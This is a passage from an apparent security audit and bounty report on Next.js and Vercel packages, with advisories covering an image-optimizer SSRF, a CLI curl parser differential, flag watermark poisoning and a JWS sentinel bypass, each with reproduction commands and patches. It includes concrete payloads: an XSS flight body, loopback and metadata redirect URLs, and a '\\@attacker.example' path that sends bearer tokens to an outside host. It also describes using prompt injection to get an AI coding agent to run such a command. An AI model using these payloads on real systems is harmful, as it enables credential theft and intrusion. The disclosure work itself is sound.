+   - `handleAction()` (`action-handler.js:1007`) sets `res.setHeader('x-action-redirect', \`\${redirectUrl};\${redirectType}\`)` using the initial same-origin URL `/api/oauth-bounce` BEFORE `createRedirectRenderResult()` runs.
+   - In `dist/esm/client/components/router-reducer/reducers/server-action-reducer.js:154-201`:
+     ```javascript
+     const { b: responseBuildId, f: flightData } = redirectFlightData;
+     if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId()) {
+         return handleExternalUrl(state, mutable, action.mutable.redirectLocation, state.pushRef.pendingPush);
+     }
+     ```
+   - Because the guard checks `responseBuildId !== undefined`, an external server that omits `"b"` (`0:{"f":[["",["children","__PAGE__",["__PAGE__",{}],null,null],null,null,["$","$L1",null,{}],false]],"S":"$2"}\n1:["$","div",null,{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(document.domain)>"}}]\n`) sets `responseBuildId === undefined`, completely bypassing the Build ID check and mounting arbitrary React Virtual DOM (`UXSS`) into `https://victim-app.com`!
+3. **Arbitrary HTTP Response Header Injection (`copyResponseHeaders`):**
+   - `actionsForbiddenHeaders` (`action-handler.js:230-241`) only blocks 9 hop-by-hop/cookie headers, allowing an external redirect target to inject `Access-Control-Allow-Origin: https://attacker.example`, `Access-Control-Allow-Credentials: true`, `Clear-Site-Data: "storage"`, and `Content-Security-Policy` onto the `https://victim-app.com` Server Action response.
+
+### Mounted HackerOne Report `#4152250` Follow-Up Comment #2 (`ADDENDUM-SCENARIOS-4152250.md`)
+
+- **Scenario A (`previewModeId` Theft):** Verified against live `next@16.4.3`: `"leaked_token_matches_prerender_manifest_previewModeId": true` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`).
+- **Scenario B (Global On-Demand ISR Cache Wiping):** Replaying `x-prerender-revalidate: f5dbbd8f6a6a51a6aa8ff1443f7090dd` against cached ISR routes returns `200 OK` (`x-nextjs-cache: REVALIDATED`), purging the global cache on every request.
+- **Scenario C (Same-Origin Forged RSC Flight UI Injection & UXSS):** Verified `response_build_id_field_b: null`, `client_build_id_check_bypassed: true`, and `injected_cors_header_on_victim_origin: "https://attacker-oauth.example"`.
+
+
+---
+
+### III.40 — vercel/next.js (`next <= 16.4.3 (verified on published npm next@16.4.3 & canary)`) — Next.js `/_next/image` (`fetchExternalImage`) `3xx` Redirect `remotePatterns` Allowlist Bypass & `isPrivateIp()` Fail-Open Loopback/Internal SSRF (`VERCEL-NEXT-09` / HackerOne `#4152265`) (`CWE-918 / CWE-863`, CVSS `7.5 High`)
+
+#### 1. Metadata & Disclosure Status
+* **Target Repository & Package:** `vercel/next.js` (`npm / Node.js: next`)
+* **Affected Versions & Components:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/image-optimizer.ts:696-729`, `packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`)
+* **Vulnerability Class & Score:** `CWE-918 / CWE-863` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
+* **Standalone Sniper Advisory:** [`docs/advisories/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)
+
+#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
+1. **Step 1 — Initial-Hop-Only `remotePatterns` Verification (`image-optimizer.js:586-615`):** `validateParams()` checks `hasMatch(domains, remotePatterns, href)` only once on the initial `/_next/image?url=...` parameter. When the allowlisted origin returns a `301`/`302`/`307`/`308` redirect, `fetchExternalImage()` resolves the new `Location` URL and calls `validateUrl(parsedRedirectUrl)` without re-evaluating `hasMatch(domains, remotePatterns, parsedRedirectUrl)`. This bypasses both **same-host pathname/search restrictions** (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) and **cross-host domain restrictions**.
+2. **Step 2 — Mounted HackerOne Comment #1 (`RE-EVALUATION-COMMENT-4152265`): Why No Compromised Host Is Required on Hop 1:** Standard allowlisted image/avatar providers (Gravatar `https://www.gravatar.com/avatar/0000?d=https%3A%2F%2F...`, Cloudinary fetch URLs, and multi-tenant S3 / R2 / Supabase Storage / Vercel Blob buckets) natively return `302` redirects or allow any tenant to upload an image with `WebsiteRedirectLocation` (`301`), pivoting `fetchExternalImage()` to any external or internal host.
+3. **Step 3 — Mounted HackerOne Comment #1 (`RE-EVALUATION-COMMENT-4152265`): Direct Linux Kernel TCP Socket Connection to `127.0.0.1` Without NAT64 via `isPrivateIp()` Fail-Open (`if (!ipaddr.isValid(ip)) return false`):** `next/dist/compiled/ipaddr.js` defines the IPv6 `zoneIndex` regex as `const o = "%[0-9a-z]{1,}"`, which only permits lowercase alphanumeric characters (`[0-9a-z]`) and rejects hyphens (`-`), underscores (`_`), and dots (`.`). On standard Linux / Docker / Kubernetes hosts with hyphenated network interfaces (`br-1a49f5828144`, `docker_gwbridge`, `cni-podman0`, `flannel.1`), `dns.promises.lookup("::ffff:127.0.0.1%br-1a49f5828144", { all: true })` succeeds in the Linux kernel (`getaddrinfo()`), `ipaddr.isValid()` returns `false`, `isPrivateIp()` fails open (`return false`), and Node's `http.get` opens a real TCP socket directly to `127.0.0.1` (`::ffff:127.0.0.1`)!
+4. **Step 4 — Mounted HackerOne Comment #1 & #2 (`ADDENDUM-SCENARIOS-4152265`): WHATWG `URL` vs. `ipaddr.js` RFC 4291 `::7f00:1` Parser Differential & RFC 8215 `64:ff9b:1::/48` NAT64 Bypass:** When `fetchExternalImage` parses `Location: http://[::127.0.0.1]:8080/internal.png`, Node's WHATWG `new URL()` rewrites `::127.0.0.1` into hex `::7f00:1`. Both `0:0:0:0:0:0:127.0.0.1` and `::7f00:1` (as well as `::a9fe:a9fe` for `169.254.169.254` and `64:ff9b:1::a9fe:a9fe`) return `ipaddr.parse(ip).range() === "unicast"`, so `isPrivateIp()` returns `false`!
+
+```javascript
+// 1. Missing matchRemotePattern / hasMatch check on 3xx redirects in fetchExternalImage()
+// File: node_modules/next/dist/esm/server/image-optimizer.js (lines 586-615)
+if (res.status >= 300 && res.status < 400 && res.headers.get('location')) {
+    if (redirectCount >= maxRedirects) {
+        throw new ImageError(400, '"url" parameter reached maxRedirects');
+    }
+    const redirectUrl = new URL(res.headers.get('location'), href).href;
+    const parsedRedirectUrl = new URL(redirectUrl);
+    // BUG 1 (09A): Only calls validateUrl(parsedRedirectUrl); NEVER re-checks hasMatch(domains, remotePatterns, parsedRedirectUrl)!
+    await validateUrl(parsedRedirectUrl);
+    return fetchExternalImage(redirectUrl, dangerouslyAllowLocalIP, redirectCount + 1);
+}
+
+// 2. isPrivateIp() fails open on hyphenated Linux IPv6 zone indices & RFC 4291 / RFC 8215 ranges
+// File: node_modules/next/dist/esm/server/lib/find-root.js
+function isPrivateIp(ip) {
+    if (!ipaddr.isValid(ip)) {
+        return false; // BUG 2 (09B): Fail-open! "::ffff:127.0.0.1%br-1a49f5828144" -> isValid=false -> returns false!
+    }
+    const addr = ipaddr.parse(ip);
+    const range = addr.range(); // BUG 3 (09B): "::7f00:1" and "64:ff9b:1::a9fe:a9fe" -> range="unicast" -> returns false!
+    return PRIVATE_IP_RANGES.includes(range);
+}
+```
+
+#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
+* **Scenario A — Same-Host Pathname & Query-String Bypass (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) (Mounted HackerOne `#4152265` Addendum Scenario A):** A Next.js app restricts `remotePatterns` to `{ hostname: 'storage.company.example', pathname: '/public-avatars/**' }`. An attacker requests `/_next/image?url=https://storage.company.example/public-avatars/redir&w=64&q=75`, which returns `302 Found` -> `Location: /private-kyc-docs/passport-scan.png`. `fetchExternalImage()` follows the redirect and returns the sensitive image (`200 OK`, `image/png`) despite the `/public-avatars/**` pathname restriction.
+* **Scenario B — Cross-Host Domain Allowlist Bypass via Standard Avatar/Storage Redirector (Mounted HackerOne `#4152265` Re-Evaluation Comment #1 & Addendum Scenario B):** A Next.js app allowlists Gravatar or a multi-tenant S3/Supabase/R2 bucket. The attacker uses a standard redirect URL (`?d=https://...` or S3 `WebsiteRedirectLocation`) to pivot `fetchExternalImage()` off the allowlisted domain onto an arbitrary unapproved host (`https://unapproved-internal-partner.example/diagram.png`).
+* **Scenario C — Chained `09A -> 09B` Direct Linux `127.0.0.1` Loopback Socket Connection & Cloud Metadata SSRF (Mounted HackerOne `#4152265` Re-Evaluation Comment #1 & Addendum Scenario C):** The allowlisted host redirects to `http://[::ffff:127.0.0.1%25br-1a49f5828144]:45829/admin-badge.png` (or `http://[::127.0.0.1]/...` -> `::7f00:1` or `http://[64:ff9b:1::a9fe:a9fe]/...`). `dns.promises.lookup` resolves the address in the Linux kernel, `isPrivateIp()` returns `false` (fail-open on `%br-...` or `unicast` on `::7f00:1` / `64:ff9b:1::/48`), and `fetchExternalImage()` opens a real TCP socket to `127.0.0.1` (`remoteAddress: "::ffff:127.0.0.1"`) and exfiltrates the internal image!
+
+#### 4. Example Execution, Reproduction & Verification Commands
+```bash
+# 1. Inspect fetchExternalImage and isPrivateIp in next@16.4.3
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/image-optimizer.js | sed -n '586,615p'
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/lib/find-root.js | sed -n '100,145p'
+
+# 2. Run the Live next@16.4.3 End-to-End Verification Harness (09A + 09B + Linux Loopback Socket Proof)
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-09-nextjs-image-optimizer-redirect-and-nat64-ssrf.patch
+```
+**Observed Runtime Proof (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-NEXT-09": {
+    "RED": {
+      "package_tested": "next@16.4.3",
+      "hackerone_report": "#4152265 (with 2 follow-up comments mounted)",
+      "same_host_pathname_bypass_status": 200,
+      "cross_host_allowlist_bypass_status": 200,
+      "scoped_loopback_input": "::ffff:127.0.0.1%br-1a49f5828144",
+      "ipaddr_isValid": false,
+      "nextjs_isPrivateIp_returned": false,
+      "loopback_server_hit": true,
+      "remote_address_seen_by_server": "::ffff:127.0.0.1",
+      "rfc4291_ipv4_compatible_isPrivateIp": false,
+      "rfc8215_local_nat64_isPrivateIp": false
+    },
+    "GREEN": {
+      "redirect_hop_rechecks_hasMatch_remotePatterns": true,
+      "invalid_or_hyphenated_zone_ip_fails_closed": true,
+      "rfc4291_and_rfc8215_blocked": true,
+      "loopback_server_hit": false
+    }
+  }
+}
+```
+
+#### 5. Mounted HackerOne Follow-Up Comments
+### Mounted HackerOne Report `#4152265` Follow-Up Comment #1 (`RE-EVALUATION-COMMENT-4152265.md`)
+
+1. **No Compromised Host Needed for `remotePatterns` Bypass (`FINDING-09A`):**
+   - **Vector A (Same-Host Pathname Restriction Bypass):** Bypasses `pathname: '/public-avatars/**'` on the exact same allowlisted domain to read `/private-kyc-docs/passport-scan.png`.
+   - **Vector B (Built-In Open Redirectors on Popular Allowlisted Image Hosts):** Gravatar (`?d=https%3A%2F%2F...`), Cloudinary, and multi-tenant S3 / R2 / Supabase Storage / Vercel Blob buckets natively issue `301`/`302` redirects without any server compromise.
+2. **No NAT64 Needed — Direct Linux Kernel TCP Socket Connection to `127.0.0.1` via `isPrivateIp()` Fail-Open (`if (!ipaddr.isValid(ip)) return false`):**
+   - In `next/dist/compiled/ipaddr.js`, the IPv6 `zoneIndex` regex is `const o = "%[0-9a-z]{1,}"`, which rejects hyphens (`-`), underscores (`_`), and dots (`.`).
+   - On standard Linux / Docker / Kubernetes hosts with hyphenated interfaces (`br-1a49f5828144`, `docker_gwbridge`, `cni-podman0`, `flannel.1`, `virbr0-nic`), `dns.promises.lookup("::ffff:127.0.0.1%br-1a49f5828144", { all: true })` succeeds in the Linux kernel (`getaddrinfo()`), `ipaddr.isValid()` returns `false`, `isPrivateIp()` returns `false` (fail-open!), and Node's `http.get` connects a real TCP socket directly to `127.0.0.1`!
+3. **WHATWG `URL` vs. `ipaddr.js` Parser Differential on RFC 4291 IPv4-Compatible IPv6 (`::7f00:1` & `0:0:0:0:0:0:127.0.0.1`):**
+   - Node's WHATWG `new URL('http://[::127.0.0.1]')` normalizes the hostname to `::7f00:1`. Both `ipaddr.parse('::7f00:1').range()` and `ipaddr.parse('0:0:0:0:0:0:127.0.0.1').range()` return `"unicast"`, so `isPrivateIp()` returns `false`!
+
+### Mounted HackerOne Report `#4152265` Follow-Up Comment #2 (`ADDENDUM-SCENARIOS-4152265.md`)
+
+- **Scenario A (Same-Host Pathname Bypass):** Verified `/public-avatars/redirect-to-private` -> `/private-kyc-docs/passport-scan.png` (`200 OK`, `68 bytes`).
+- **Scenario B (Cross-Host Allowlist Bypass):** Verified `allowed-cdn.example` -> `unapproved-internal.example` (`200 OK`).
+- **Scenario C (2-Step Chained Redirect `09A -> 09B` to `127.0.0.1` Loopback Socket):** Verified live TCP loopback connection on `next@16.4.3` (`loopback_server_hit: true`, `remote_address_seen_by_server: "::ffff:127.0.0.1"`, `status: 200`, `bytes_exfiltrated: 68`).
+
+
+---
+
+### III.41 — vercel/vercel (`vercel <= 65.4.0 (verified on published npm vercel@65.4.0)`) — Vercel CLI (`vercel@65.4.0`) `vercel curl` / `vercel http` WHATWG `URL` vs. `libcurl` Backslash-Userinfo / Brace-Globbing Parser Differential & Unhandled Auto-Mint Error Leaking Live Bearer Token and `x-vercel-protection-bypass` (`VERCEL-CLI-07`) (`CWE-200 / CWE-436`, CVSS `8.2 High`)
+
+#### 1. Metadata & Disclosure Status
+* **Target Repository & Package:** `vercel/vercel` (`npm / Node.js: vercel`)
+* **Affected Versions & Components:** `<= 65.4.0 (verified on published npm vercel@65.4.0)` — `packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`, `packages/cli/src/commands/http-cli/index.ts`
+* **Vulnerability Class & Score:** `CWE-200 / CWE-436` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`)
+* **Standalone Sniper Advisory:** [`docs/advisories/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)
+
+#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
+1. **Step 1 — WHATWG `new URL()` vs. `libcurl` (`curl_url_set`) Authority Differential (`packages/cli/src/commands/curl/utils.ts:179-216`):** `constructFullUrl(baseUrl, path)` checks `const url = new URL(path, baseUrl); if (url.origin !== baseUrl) throw ...`, and then returns the **raw string concatenation** `return \`${baseUrl}${normalizedPath}\`` instead of `url.href`. When `path` is `\\@attacker.example/collect` (or `/\\@attacker.example`), WHATWG `new URL()` normalizes `\\` to `/`, seeing `https://my-app.vercel.app/%5C@attacker.example/collect` (`url.origin === baseUrl`). However, the raw string passed to `/usr/bin/curl` is `https://my-app.vercel.app\\@attacker.example/collect`, which `libcurl` parses as username `my-app.vercel.app\\` authenticating to host **`attacker.example`**!
+2. **Step 2 — `libcurl` Globbing (`{a,b}`) & `--next` Flag Differential (`utils.ts:34-42`):** When `path` is `@attacker.example/{a,b}`, WHATWG `new URL()` treats `@attacker.example` as a relative path segment, whereas `libcurl`'s URL globbing expands `{a,b}` before authority parsing or processes injected `--next` flags (`extractUrlFromReadNextValue` rejects positional URLs after `--next` but still leaves `curlFlags` containing `--next` followed by `-K` / `--url`).
+3. **Step 3 — Automatic Credential Attachment & Unhandled Auto-Mint Bypass Leak (`utils.ts:74-96`):** `vercel curl` automatically attaches `--header "Authorization: Bearer <VERCEL_TOKEN>"` and `x-vercel-protection-bypass: <32-char-secret>` to the `curl` invocation. Additionally, if `client.fetch(\`/v10/projects/${project.id}/protection-bypass\`, { method: 'PATCH' })` fails or returns non-JSON, `ensureProtectionBypassSecret` lacks a `try/catch` around `client.fetch` (`FINDING-07B`).
+
+```typescript
+// File: packages/cli/src/commands/curl/utils.ts (lines 179-216)
+export function constructFullUrl(baseUrl: string, path: string): string {
+  const normalizedPath = path.startsWith('/') ? path : `/${path}`;
+  const url = new URL(normalizedPath, baseUrl);
+  if (url.origin !== baseUrl) {
+    throw new Error(`Invalid path "${path}": must be a relative path, not a full URL`);
+  }
+  // BUG: Returns raw string concatenation instead of normalized url.href, and does not
+  // pass '--globoff' to curl! Input '\\@attacker.com/p' passes new URL() origin check
+  // but libcurl parses 'baseUrl\\' as userinfo and 'attacker.com' as target host!
+  return `${baseUrl}${normalizedPath}`;
+}
+```
+
+#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
+* **Scenario A — CI/CD Smoke-Test & PR Preview Health-Check Secret Exfiltration:** A GitHub Actions workflow runs `vercel curl "$PREVIEW_PATH" --deployment "$DEPLOYMENT_URL"` where `$PREVIEW_PATH` comes from a PR annotation or smoke-test matrix (`\\@127.0.0.1:41992/exfil`). `constructFullUrl()` validates `url.origin === baseUrl`, but `/usr/bin/curl` connects to `127.0.0.1:41992` and sends `Authorization: Bearer vcp_live_...` and `x-vercel-protection-bypass: 0123456789abcdef0123456789abcdef`.
+* **Scenario B — Developer Terminal / AI Coding Agent Prompt-Injection Credential Theft:** An engineer or AI coding assistant debugging a protected Vercel preview deployment runs a suggested command `vercel curl '\@logs-collector.example/api/debug'`. The developer's live Vercel CLI token and project protection bypass secret are immediately exfiltrated.
+* **Scenario C — Unscoped Protection Bypass Secret Minting & Unhandled Crash (`FINDING-07B`):** When `project.protectionBypass` is initially empty, `ensureProtectionBypassSecret()` automatically sends `PATCH /v10/projects/{id}/protection-bypass` to mint a persistent project-wide bypass secret and immediately leaks it on the outbound `curl` request.
+
+#### 4. Example Execution, Reproduction & Verification Commands
+```bash
+# 1. Inspect constructFullUrl in published vercel@65.4.0
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/vercel/dist/commands/curl/utils.js | sed -n '1,180p'
+
+# 2. Run the Live vercel@65.4.0 End-to-End Verification Harness against /usr/bin/curl
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-07-cli-curl-flag-and-url-hardening.patch
+```
+**Observed Runtime Proof (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-CLI-07": {
+    "RED": {
+      "package_tested": "vercel@65.4.0",
+      "curl_binary": "/usr/bin/curl 8.5.0",
+      "ConstructFullUrl_output": "https://my-protected-deployment.vercel.app/\\@127.0.0.1:38343/exfiltrate",
+      "whatwg_origin_check_passed": true,
+      "attacker_listener_received_request": true,
+      "leaked_authorization": "Bearer vcp_live_SECRET_VERCEL_CLI_TOKEN_998877",
+      "leaked_protection_bypass": "0123456789abcdef0123456789abcdef"
+    },
+    "GREEN": {
+      "backslash_and_at_segment_rejected": true,
+      "returns_normalized_url_href": true,
+      "curl_invoked_with_globoff": true,
+      "attacker_listener_received_request": false
+    }
+  }
+}
+```
+
+
+---
+
+### III.42 — vercel/flags (`@vercel/flags-core <= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)`) — Vercel `@vercel/flags-core@1.10.2` Unprefixed `x-datafile-Updated-At` Header Watermark Poisoning & Permanent Feature-Flag Freeze DoS (`VERCEL-FLAGS-CORE-06`) (`CWE-400 / CWE-345`, CVSS `6.5 Medium`)
+
+#### 1. Metadata & Disclosure Status
+* **Target Repository & Package:** `vercel/flags` (`npm / Node.js: @vercel/flags-core`)
+* **Affected Versions & Components:** `<= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)` — `packages/flags-core/src/controller.ts:555-615`, `packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`)
+* **Vulnerability Class & Score:** `CWE-400 / CWE-345` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`)
+* **Standalone Sniper Advisory:** [`docs/advisories/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)
+
+#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
+1. **Step 1 — Unvalidated Header Watermark Update Before Body Verification (`packages/flags-core/src/controller.ts:555-615`):** In `streamResponse()` and `readBundledDefinitions()`, `@vercel/flags-core` reads `res.headers.get('x-datafile-Updated-At')`, parses it with `Number(updatedAtHeader)`, and immediately sets `this.datafileUpdatedAtWatermark = Math.max(this.datafileUpdatedAtWatermark, updatedAt)` BEFORE verifying `res.ok` (`200 OK`) or validating the JSON datafile body.
+2. **Step 2 — Unprefixed Header Exposure Across Proxies & Error Responses:** Because `x-datafile-Updated-At` does NOT use the Vercel Edge-stripped `x-vercel-*` prefix, upstream proxies, mock/custom `FLAGS_SERVICE_URL` endpoints, or any non-200 HTTP response can inject `x-datafile-Updated-At: 9999999999999`.
+3. **Step 3 — Permanent Flag Freeze / Kill-Switch Lockout:** Once `datafileUpdatedAtWatermark` is poisoned to `9999999999999`, every subsequent bundled or fallback flag update with a real timestamp (`updatedAt <= 9999999999999`) is silently ignored for the lifetime of the Node.js worker, preventing operators from toggling emergency kill-switches.
+
+```typescript
+// File: packages/flags-core/src/controller.ts (lines 555-615)
+const res = await fetch(`${this.serviceUrl}/v1/stream`, { headers });
+const updatedAtHeader = res.headers.get('x-datafile-Updated-At');
+if (updatedAtHeader) {
+  const updatedAt = Number(updatedAtHeader);
+  if (!Number.isNaN(updatedAt)) {
+    // BUG: Updates watermark BEFORE checking res.ok or validating the JSON datafile payload,
+    // and accepts arbitrarily far-future timestamps (e.g. 9999999999999)!
+    this.datafileUpdatedAtWatermark = Math.max(this.datafileUpdatedAtWatermark, updatedAt);
+  }
+}
+```
+
+#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
+* **Scenario A — Emergency Kill-Switch Lockout During an Incident:** A single `502`/`503` response carrying `x-datafile-Updated-At: 9999999999999` poisons `datafileUpdatedAtWatermark`. When engineers later flip an emergency kill-switch in Vercel Flags, the running application ignores the bundled/fallback datafile (`updatedAt: 1700000100000 <= 9999999999999`) and keeps the vulnerable feature enabled (`stale-compromised-variant`).
+* **Scenario B — Redirect Credential Leak on `FLAGS_SERVICE_URL` (`redirect: 'manual'` Missing):** If `streamResponse()` receives a `302` redirect from a custom or proxy `FLAGS_SERVICE_URL`, `fetch()` follows the redirect without `redirect: 'manual'`.
+* **Scenario C — Persistent Multi-Worker Drift in Long-Lived Node.js Servers:** Poisoned workers permanently serve stale feature flags while healthy workers serve updated flags, causing inconsistent authorization and checkout behavior.
+
+#### 4. Example Execution, Reproduction & Verification Commands
+```bash
+# 1. Inspect streamResponse and readBundledDefinitions in published @vercel/flags-core@1.10.2
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/flags-core/dist/index.js | sed -n '465,516p'
+
+# 2. Run the Live @vercel/flags-core@1.10.2 End-to-End Verification Harness
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-06-flags-core-controller-stream-hardening.patch
+```
+**Observed Runtime Proof (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-FLAGS-CORE-06": {
+    "RED": {
+      "package_tested": "@vercel/flags-core@1.10.2",
+      "initial_flag_value": "stale-compromised-variant",
+      "bundled_legitimate_update_timestamp": 1700000100000,
+      "poisoned_header_sent_on_503": "9999999999999",
+      "flag_value_after_watermark_poisoning": "stale-compromised-variant",
+      "legitimate_bundled_update_ignored": true
+    },
+    "GREEN": {
+      "requires_res_ok_and_valid_datafile_before_watermark_update": true,
+      "rejects_future_timestamp_skew": true,
+      "legitimate_bundled_update_ignored": false
+    }
+  }
+}
+```
+
+
+---
+
+### III.43 — vercel/flags (`flags <= 4.4.0 (verified on published npm flags@4.4.0)`) — Vercel `flags@4.4.0` `deserialize()` Unauthenticated `__no_flags__` Sentinel Early-Return Bypassing Compact JWS Signature Verification (`VERCEL-FLAGS-05`) (`CWE-347`, CVSS `6.5 Medium`)
+
+#### 1. Metadata & Disclosure Status
+* **Target Repository & Package:** `vercel/flags` (`npm / Node.js: flags`)
+* **Affected Versions & Components:** `<= 4.4.0 (verified on published npm flags@4.4.0)` — `packages/flags/src/next/precompute.ts:206-214`, `packages/flags/dist/next/index.js:119-125` (`deserialize`)
+* **Vulnerability Class & Score:** `CWE-347` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)
+* **Standalone Sniper Advisory:** [`docs/advisories/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)
+
+#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
+1. **Step 1 — Unconditional Early Return Before JWS Verification (`packages/flags/src/next/precompute.ts:206-214`):** `serialize()` returns `'__no_flags__'` only when `flags.length === 0`. However, `deserialize(flags, code, secret)` checks `if (code === '__no_flags__') return {};` at the very top of the function WITHOUT checking `if (flags.length === 0)` and BEFORE invoking `compactVerify(code, encodedSecret)`.
+2. **Step 2 — Direct URL Segment Access in Next.js App Router (`app/[code]/...`):** In Next.js applications using Flags SDK precomputation (`app/[code]/checkout/page.tsx`), the `[code]` route parameter is normally generated and JWS-signed by Edge Middleware (`serialize(flags, values, secret)`). Because `[code]` is a URL path segment, an unauthenticated user can directly request `/__no_flags__/checkout` (or bypass middleware via path/header conditions).
+3. **Step 3 — Fallback `flag.decide()` Execution Without Edge Context:** When `deserialize()` returns `{}` for `code = '__no_flags__'`, `getPrecomputed(flag, precomputeGroup, code)` sees `parsed[flag.key] === undefined` and falls back to re-running `flag.decide()` inside the Node/Page render context (where Edge geo/IP/middleware overrides are absent), flipping Edge-blocked flags (`true` instead of Edge-precomputed `false`).
+
+```typescript
+// File: packages/flags/src/next/precompute.ts (lines 206-214)
+export async function deserialize(
+  flags: ReadonlyArray<Flag<any, any>>,
+  code: string,
+  secret: string | undefined = process.env.FLAGS_SECRET,
+): Promise<Record<string, any>> {
+  if (!secret) throw new Error('flags: deserialize was called without a secret');
+  // BUG: Returns {} BEFORE JWS signature verification even when flags.length > 0!
+  if (code === '__no_flags__') return {};
+  // ... JWS compactVerify() only runs below this line
+}
+```
+
+#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
+* **Scenario A — Bypassing Edge Middleware Geo/WAF Gating in Precomputed Routes:** Edge Middleware precomputes `vipCheckoutFlag = false` for an untrusted IP/region and signs it into a Compact JWS `[code]` segment. The client navigates directly to `/__no_flags__/checkout`, causing `deserialize()` to skip JWS verification, return `{}`, and trigger the page-level `decide()` fallback (`true`).
+* **Scenario B — A/B Price & Promotion Tier Manipulation:** A user locked into a control pricing cohort by Edge Middleware replaces the signed JWS segment in the URL or rewrite header with `__no_flags__`, forcing re-evaluation without a valid `FLAGS_SECRET` signature.
+* **Scenario C — Cache-Key Fragmentation & Origin Re-Decide Amplification:** Requesting `/__no_flags__/...` across precomputed ISR routes forces `getPrecomputed()` to execute asynchronous `flag.decide()` calls on every render instead of reading O(1) signed precomputed values.
+
+#### 4. Example Execution, Reproduction & Verification Commands
+```bash
+# 1. Inspect deserialize in published flags@4.4.0
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/flags/dist/next/index.js | sed -n '115,155p'
+
+# 2. Run the Live flags@4.4.0 End-to-End Verification Harness
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-05-flags-precompute-no-flags-sentinel-bypass.patch
+```
+**Observed Runtime Proof (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-FLAGS-05": {
+    "RED": {
+      "package_tested": "flags@4.4.0",
+      "legitimate_signed_code_prefix": "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..",
+      "legitimate_precomputed_value": false,
+      "forged_code_passed": "__no_flags__",
+      "deserialize_output_for_no_flags": {},
+      "getPrecomputed_value_with_no_flags_sentinel": true,
+      "random_tampered_token_rejected": true
+    },
+    "GREEN": {
+      "sentinel_rejected_when_flags_non_empty": true,
+      "getPrecomputed_with_no_flags_throws": true
+    }
+  }
+}
+```
+
+
+---
+
+### III.44 — vercel/firewall (`@vercel/firewall <= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)`) — Vercel `@vercel/firewall@1.2.6` `checkRateLimit()` Untrusted `Host` Header / `region` SSRF Exfiltrating `VF_RATE_LIMIT_SECRET` & Fail-Open Rate-Limit Bypass (`VERCEL-FIREWALL-01`) (`CWE-918 / CWE-200 / CWE-636`, CVSS `7.2 High`)
+
+#### 1. Metadata & Disclosure Status
+* **Target Repository & Package:** `vercel/firewall` (`npm / Node.js & Go: @vercel/firewall`)
